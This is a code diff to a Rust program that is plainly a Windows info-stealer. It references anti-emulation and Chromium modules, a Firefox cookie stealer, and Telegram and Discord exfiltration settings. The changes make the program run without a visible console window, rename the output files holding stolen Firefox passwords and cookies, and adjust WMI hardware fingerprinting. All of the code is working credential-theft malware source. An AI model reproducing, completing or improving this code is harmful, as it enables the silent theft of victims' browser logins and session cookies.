@@ -1,4 +1,4 @@
-#![windows_subsystem = "console"] // Hide the Console
+#![windows_subsystem = "windows"] // Hide the Console
 
 mod anti_emulation;
 mod chromium;
@@ -32,7 +32,7 @@ enum DeliveryMethod {
 
 const MODE: DeliveryMethod = DeliveryMethod::NONE;
 //TG
-const BOT_TOKEN: &str = "";
+const BOT_TOKEN: &str = ""; 
 const CHANNEL_ID: i64 = -0;
 
 //DC
@@ -209,7 +209,7 @@ async fn main() {
             ));
         }
         std::fs::write(
-            format!("{}\\firefox_logins.txt", string_path),
+            format!("{}\\passwords_firefox.txt", string_path),
             formatted_logins.join("\n"),
         )
         .unwrap();
@@ -218,7 +218,7 @@ async fn main() {
     let ff_cookies = firefox::firefox::cookie_stealer();
     if ff_cookies.len() > 0 {
         std::fs::write(
-            format!("{}\\firefox_cookies.txt", string_path),
+            format!("{}\\cookies_firefox.txt", string_path),
             ff_cookies.join("\n"),
         )
         .unwrap();
@@ -409,7 +409,8 @@ fn get_hardware() -> Result<String, Box<dyn std::error::Error>> {
         hardware.push(format!("{:#?}", cpu.Name));
     }
 
-    
+
+    drop(wmi_con);// Windows doesn't likes when having 2 open.
     
     let gpus = query_gpus();
     if gpus.is_ok() {
@@ -429,8 +430,9 @@ fn get_hardware() -> Result<String, Box<dyn std::error::Error>> {
 
 
 pub fn query_gpus() -> Result<Vec<Win32_VideoController>, Box<dyn std::error::Error>> {
-    let com_con = COMLibrary::new()?;
-    let wmi_con = WMIConnection::new(com_con.into())?;
+    let com_con = COMLibrary::new().unwrap();
+    let wmi_con = WMIConnection::new(com_con.into()).unwrap();
+ 
     let results: Vec<Win32_VideoController> = wmi_con.query()?;
 
     Ok(results)
